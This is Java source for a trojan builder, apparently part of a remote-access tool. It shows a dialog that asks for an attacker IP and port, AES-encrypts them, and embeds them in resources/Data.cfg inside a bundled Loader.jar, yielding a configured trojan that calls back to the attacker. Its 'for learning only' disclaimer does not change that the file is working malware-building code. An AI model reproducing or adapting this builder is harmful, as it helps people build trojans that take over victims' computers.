package me.server.createtrojan;

import com.sun.jna.platform.WindowUtils;
import me.server.utils.AESUtils;
import sun.misc.IOUtils;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class CreateTrojan {
    public static void Create(){
        System.setProperty("sun.java2d.noddraw", "true");
        InputStream inputStream = CreateTrojan.class.getClassLoader().getResourceAsStream("me/server/jar/Loader.jar");
        JDialog frame1 = new JDialog();
        WindowUtils.setWindowAlpha(frame1,0.8f);
        JTextField textField = new JTextField(25);
        JTextField textField1 = new JTextField(7);
        frame1.setResizable(false);
        JPanel panel1 = new JPanel();
        JPanel panel2 = new JPanel();
        JLabel label = new JLabel("IP");
        JLabel label1 = new JLabel("端口");
        panel2.add(label);
        panel2.add(textField);
        panel2.add(label1);
        panel2.add(textField1);
        JButton button = new JButton("生成");
        panel1.add(button);
        frame1.setTitle("生成小马");
        JTextArea  area1 = new JTextArea();
        area1.setEditable(false);
        area1.append("欢迎使用生成小马" + "\n");
        area1.append("请认真填写IP和端口号" + "\n");
        area1.append("小马将生成在本目录下" + "\n");
        area1.append("本软件仅用于学习交流 请勿用于违法用途" + "\n");
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        area1.setFont(font);
        JScrollPane scrollPane = new JScrollPane(area1);
        frame1.add(scrollPane,BorderLayout.CENTER);
        frame1.add(panel1,BorderLayout.SOUTH);
        frame1.add(panel2,BorderLayout.NORTH);
        area1.setBackground(Color.BLACK);
        area1.setForeground(Color.green);
        area1.setEditable(false);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(600,350);
        frame1.setVisible(true);
        button.addActionListener(a->{
            try {
                File file = new File(System.getProperty("user.dir") + "\\Temp.jar");
                byte[] bytes = new byte[1024];
                int len = 0;
                if(file.exists()) {
                    JOptionPane.showMessageDialog(null,"检测到当前目录已有同名文件!","生成错误",JOptionPane.ERROR_MESSAGE);
                }else {
                    File tempFile = new File(System.getProperty("user.dir") + "\\Temp.jar");
                    String IPAndPort = "IP:" + textField.getText() + "|" + "Port:" + textField1.getText();
                    file.createNewFile();
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    while ((len = inputStream.read(bytes))!=-1) {
                        fileOutputStream.write(bytes,0,len);
                    }
                    WriteFile(new String(AESUtils.encryption(IPAndPort)));
                    JOptionPane.showMessageDialog(null,"Loader.jar生成成功!","生成小马",JOptionPane.INFORMATION_MESSAGE);
                    frame1.dispose();
                    fileOutputStream.close();
                    tempFile.delete();
                }
            }catch (Exception e) {
            }
        });
    }
    public static void WriteFile(String s) {
        try (
                JarFile jarFile = new JarFile(System.getProperty("user.dir") + "\\Temp.jar");
                JarOutputStream jos = new JarOutputStream(new FileOutputStream(System.getProperty("user.dir") + "\\Loader.jar"))
        ) {
            for (Enumeration<JarEntry> entries = jarFile.entries(); entries.hasMoreElements();) {
                JarEntry entry = entries.nextElement();
                try (InputStream is = jarFile.getInputStream(entry)) {
                    jos.putNextEntry(new JarEntry(entry.getName()));
                    if ("resources/Data.cfg".equals(entry.getName())) {
                        jos.write(s.getBytes());
                    } else {
                        jos.write(IOUtils.readNBytes(is, is.available()));
                    }
                    jos.closeEntry();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}